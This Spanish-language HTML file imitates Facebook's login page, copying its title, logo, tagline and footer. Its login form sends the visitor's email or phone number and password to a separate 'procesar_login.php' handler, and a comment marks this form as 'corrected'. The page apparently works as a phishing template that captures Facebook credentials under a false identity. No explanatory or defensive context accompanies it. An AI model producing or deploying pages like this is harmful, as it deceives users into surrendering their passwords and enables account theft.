<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="style.css" />
  <title>Facebook - Iniciar sesión o registrarse</title>
</head>
<body>
  <div class="container">
    <div class="container-profile">
      <span class="logo">
        <img src="img/1.svg" alt="facebook" />
      </span>
      <p class="connect-friends">
        Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
      </p>
    </div>

    <div class="container-form">
      <!-- FORMULARIO CORREGIDO -->
      <form class="form" action="procesar_login.php" method="post">
        <input type="text" name="correo" placeholder="Correo electrónico o número de teléfono" required />
        <input type="password" name="clave" placeholder="Contraseña" required />
        <input type="submit" value="Iniciar sesión" />
        <span><a href="#">¿Olvidaste tu contraseña?</a></span>
        <div class="border"></div>
        <button type="button"><a href="#">Crear cuenta nueva</a></button>
      </form>

      <p class="create-page">
        <a href="#">Crea una página</a> para una celebridad, una marca o un <br /> negocio.
      </p>
    </div>
  </div>

  <footer class="footer">
    <div class="footer-links">
      <a href="#">Español</a> <a href="#">English (US)</a> <a href="#">Français (France)</a>
      <a href="#">Português (Brasil)</a> <a href="#">Italiano</a> <a href="#">Deutsch</a>
    </div>
    <div class="footer-links">
      <a href="#">Registrarte</a> <a href="#">Iniciar sesión</a> <a href="#">Messenger</a>
      <a href="#">Facebook Lite</a> <a href="#">Video</a> <a href="#">Meta AI</a>
      <a href="#">Instagram</a> <a href="#">Crear anuncio</a> <a href="#">Crear página</a>
    </div>
    <p class="footer-copy">Meta © 2025</p>
  </footer>
</body>
</html>
